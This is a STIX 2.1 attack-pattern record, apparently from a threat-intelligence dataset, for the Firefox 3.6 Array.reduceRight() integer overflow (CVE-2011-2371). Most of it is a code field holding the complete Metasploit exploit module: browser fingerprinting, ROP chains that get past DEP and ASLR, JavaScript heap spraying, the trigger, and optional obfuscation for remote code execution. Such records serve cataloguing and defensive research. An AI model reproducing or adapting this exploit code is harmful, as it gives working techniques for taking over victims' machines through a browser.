{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3095d285-6d1e-46a9-8652-99c8d667ea54",
    "created": "2024-08-14T16:43:37.857673Z",
    "modified": "2024-08-14T16:43:37.857677Z",
    "name": "\"Mozilla Firefox Array.reduceRight() Integer Overflow\"",
    "description": " This module exploits a vulnerability found in Mozilla Firefox 3.6. When an array object is configured with a large length value, the reduceRight() method may cause an invalid index being used, allowing arbitrary remote code execution. Please note that the exploit requires a longer amount of time (compare to a typical browser exploit) in order to gain control of the machine.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/mozilla_reduceright.rb",
            "external_id": "mozilla_reduceright.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-2371"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=664009"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Mozilla Firefox Array.reduceRight() Integer Overflow\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in Mozilla Firefox 3.6. When an\n        array object is configured with a large length value, the reduceRight() method\n        may cause an invalid index being used, allowing arbitrary remote code execution.\n        Please note that the exploit requires a longer amount of time (compare to a\n        typical browser exploit) in order to gain control of the machine.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Chris Rohlf',    #Matasano Security (Initial discovery according to Mozilla.org)\n          'Yan Ivnitskiy',  #Matasano Security (Initial discovery with Chris?)\n          'Matteo Memelli', #PoC from Exploit-DB\n          'dookie2000ca',   #\"Helping\" ryujin (Matteo)\n          'sinn3r',         #Metasploit\n          'mr_me <steventhomasseeley[at]gmail.com>',  #XP target (no aslr)\n          'TecR0c <roccogiovannicalvi[at]gmail.com>', #XP target (no aslr)\n        ],\n      'References'     =>\n        [\n          ['CVE', '2011-2371'],\n          ['OSVDB', '73184'],\n          ['EDB', '17974'],\n          ['URL', 'https://bugzilla.mozilla.org/show_bug.cgi?id=664009']\n        ],\n      'Payload'        =>\n        {\n          'BadChars'        => \"\\x00\",\n          'PrependEncoder'  => \"\\xbc\\x0c\\x0c\\x0c\\x0c\",\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => \"process\",\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n          [\n            # if we dont have aslr, lets not deal with it\n            # Windows XP (no JAVA)\n            'Mozilla Firefox 3.6.16 (no JAVA)',\n            {\n              'pivot'  => 0x104C26F0, # 1st pivot [push esi;pop esp;and [esi+44],0;xor eax,eax;pop esi;retn 4]\n              'pivot2' => 0x10055326, # 2nd pivot [add esp,40;ret]\n            }\n          ],\n          [\n            #Vista / win 7 (using JAVA) to defeat aslr\n            'Mozilla Firefox 3.6.16 (JAVA)',\n            {\n              'pivot'  => 0x7c370eef, # 1st pivot [lea esp,[esi-3];dec [ebx];ret 1C75]\n              'pivot2' => 0xcafebabe, # fake\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-06-21',\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation'])\n      ])\n  end\n\n  def junk(n=4)\n    return rand_text_alpha(n).unpack(\"L\")[0].to_i\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    if agent !~ /Firefox\\/3\\.6\\.(16|17)/\n      print_error(\"This browser is not supported: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    my_target = target\n    if my_target.name == 'Automatic'\n      if agent =~ /NT 5\\.1/ && agent =~ /Firefox\\/3\\.6\\.16/\n        my_target = targets[1]\n      elsif agent =~ /NT 6\\.[01]/ && agent =~ /Firefox\\/3\\.6\\.16/\n        my_target = targets[2]\n      else\n        print_error(\"This browser is not a viable target: #{agent}\")\n        send_not_found(cli)\n        return\n      end\n    end\n\n    table = [junk(2)].pack('v*')\n    table << [\n      0x0c000048,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n    ].pack('V*')\n    table << [junk(2)].pack('v*')\n    table << [\n      my_target['pivot'],\n      junk,\n    ].pack('V*')\n    table << [junk(2)].pack('v*')\n    table << [\n      0x3410240c,\n      0x0c00007c,\n      my_target['pivot2'],\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      0x0c00002e,\n    ].pack('V*')\n\n    # random\n    js_applet = rand_text_alpha(rand(10) + 5)\n    a_trigger = rand_text_alpha(rand(10) + 5)\n\n    randnop = rand_text_alpha(rand(100) + 1)\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4)\n\n    if my_target.name =~ /\\(JAVA\\)/\n\n      #mona.py tekniq! + Payload\n      rop = [\n        0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\n        0x7c37a140,  # Make EAX readable\n        0x7c37591f,  # PUSH ESP # ... # POP ECX # POP EBP # RETN (MSVCR71.dll)\n        0x7c348b06,  # EBP (NOP)\n        0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\n        0x7c37a140,  # <- VirtualProtect() found in IAT\n        0x7c3530ea,  # MOV EAX,DWORD PTR DS:[EAX] # RETN (MSVCR71.dll)\n        0x7c346c0b,  # Slide, so next gadget would write to correct stack location\n        0x7c376069,  # MOV [ECX+1C],EAX # P EDI # P ESI # P EBX # RETN (MSVCR71.dll)\n        0x7c348b06,  # EDI (filler)\n        0x7c348b06,  # will be patched at runtime (VP), then picked up into ESI\n        0x7c348b06,  # EBX (filler)\n        0x7c376402,  # POP EBP # RETN (msvcr71.dll)\n        0x7c345c30,  # ptr to push esp #  ret  (from MSVCR71.dll)\n        0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\n        0xfffff82f,  # size 20001 bytes\n        0x7c351e05,  # NEG EAX # RETN (MSVCR71.dll)\n        0x7c354901,  # POP EBX # RETN (MSVCR71.dll)\n        0xffffffff,  # pop value into ebx\n        0x7c345255,  # INC EBX # FPATAN # RETN (MSVCR71.dll)\n        0x7c352174,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN (MSVCR71.dll)\n        0x7c34d201,  # POP ECX # RETN (MSVCR71.dll)\n        0x7c38b001,  # RW pointer (lpOldProtect) (-> ecx)\n        0x7c34b8d7,  # POP EDI # RETN (MSVCR71.dll)\n        0x7c34b8d8,  # ROP NOP (-> edi)\n        0x7c344f87,  # POP EDX # RETN (MSVCR71.dll)\n        0xffffffc0,  # value to negate, target value : 0x00000040, target: edx\n        0x7c351eb1,  # NEG EDX # RETN (MSVCR71.dll)\n        0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\n        0x90909090,  # NOPS (-> eax)\n        0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN (MSVCR71.dll)\n      ].pack('V*')\n\n      p = payload.encoded\n      arch = Rex::Arch.endian(target.arch)\n      js_payload = Rex::Text.to_unescape(rop + p, arch)\n      js_ptrs    = Rex::Text.to_unescape(table, arch)\n\n      #Pretty much based on Matteo's code except for the size adjustment to avoid a busted heap\n      js = <<-JS\n      var applet = document.getElementById('#{js_applet}');\n\n      function spray() {\n        var ptrs = unescape(\"#{js_ptrs}\");\n\n        var bheader  = 0x12/2;\n        var nullt    = 0x2/2;\n\n        var espoffset  = (7340 /2) - ptrs.length;\n        var #{randnop} = \"#{js_nops}\";\n        var esppadding = unescape(#{randnop});\n        while(esppadding.length < espoffset) esppadding += esppadding;\n        esppadding = esppadding.substring(0, espoffset);\n\n        var payload = unescape(\"#{js_payload}\");\n\n        var tr_padding = unescape(#{randnop});\n        while (tr_padding.length < 0x7fa00) {tr_padding += tr_padding;}\n\n        var dummy = ptrs + esppadding + payload + tr_padding;\n        var hspray = dummy.substring(0,0x7fa00 - bheader - nullt);\n\n        HeapBlocks = new Array()\n        for (i=0;i<0x60;i++){\n          HeapBlocks[i] += hspray;\n        }\n      }\n      spray();\n      obj = new Array;\n      obj.length = 2197815302;\n      f = function trigger(prev, myobj, indx, array) {\n        alert(myobj[0]);\n      }\n      obj.reduceRight(f,1,2,3);\n      JS\n\n      js = js.gsub(/^ {4}/, '')\n\n      if datastore['OBFUSCATE']\n        js = ::Rex::Exploitation::JSObfu.new(js)\n        js.obfuscate(memory_sensitive: true)\n      end\n\n      html = <<-HTML\n      <html>\n      <head>\n      </head>\n      <body>\n      <applet id=\"#{js_applet}\" code=\"#{a_trigger}.class\" width=0 height=0>\n      </applet>\n      <script>\n      #{js}\n      </script>\n      </body>\n      <html>\n      HTML\n\n    elsif my_target.name =~ /\\(no JAVA\\)/\n\n      # DEP bypass using xul.dll\n      rop =\n      [\n        junk,\n        junk,\n        junk,\n        junk,\n        junk,\n        0x101f1806,  # POP EAX # RETN [xul.dll]\n        0x1083828C,  # ptr to &VirtualAlloc() [IAT xul.dll]\n        0x103e0d7b,  # MOV ESI,DWORD PTR DS:[EAX] # RETN [xul.dll]\n        0x102d8002,  # POP EBP # RETN [xul.dll]\n        0x1003876b,  # & jmp esp [xul.dll]\n        0x10040001,  # POP EBX # RETN [xul.dll]\n        0x00000001,  # 0x00000001-> ebx\n        0x104e6917,  # POP EDX # RETN [xul.dll]\n        0x00001000,  # 0x00001000-> edx\n        0x102ac000,  # POP ECX # RETN [xul.dll]\n        0x00000040,  # 0x00000040-> ecx\n        0x102e0005,  # POP EDI # RETN [xul.dll]\n        0x102ac001,  # RETN (ROP NOP) [xul.dll]\n        0x101f1806,  # POP EAX # RETN [xul.dll]\n        0x90909090,  # nop\n        0x102b3401,  # PUSHAD # RETN [xul.dll]\n      ].pack(\"V*\")\n\n      p = payload.encoded\n      arch = Rex::Arch.endian(target.arch)\n      js_payload = Rex::Text.to_unescape(rop + p, arch)\n      js_ptrs    = Rex::Text.to_unescape(table, arch)\n\n      # java loading forces the alloctor to use more blocks, since we\n      # dont load java we will just spray a little more..\n      js = <<-JS\n      var myobject = document.getElementById('d');\n\n      function spray() {\n        var ptrs = unescape(\"#{js_ptrs}\");\n\n        var bheader  = 0x12/2;\n        var nullt    = 0x2/2;\n\n        var payload = unescape(\"#{js_payload}\");\n\n        var #{randnop} = \"#{js_nops}\";\n        var tr_padding = unescape(#{randnop});\n        while (tr_padding.length < 0x7fa00) {tr_padding += tr_padding;}\n\n        var dummy = ptrs + payload + tr_padding;\n        var hspray = dummy.substring(0,0x7fa00 - bheader - nullt);\n\n        HeapBlocks = new Array()\n        for (i=0;i<0x100;i++){\n          HeapBlocks[i] += hspray;\n        }\n      }\n      spray();\n      obj = new Array;\n      obj.length = 2197815302;\n      f = function trigger(prev, myobj, indx, array) {\n        alert(myobj[0]);\n      }\n      obj.reduceRight(f,1,2,3);\n      JS\n\n      if datastore['OBFUSCATE']\n        js = ::Rex::Exploitation::JSObfu.new(js)\n        js.obfuscate(memory_sensitive: true)\n      end\n\n      js = js.gsub(/^ {4}/, '')\n\n      html = <<-HTML\n      <html>\n      <head>\n      </head>\n      <body>\n      <object id=\"d\"><object>\n      <script>\n      #{js}\n      </script>\n      </body>\n      <html>\n      HTML\n\n    end\n\n    html = html.gsub(/^ {4}/, '')\n\n    print_status(\"Sending #{self.name}\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-06-21",
    "x_mitre_platforms": [
        "win'"
    ]
}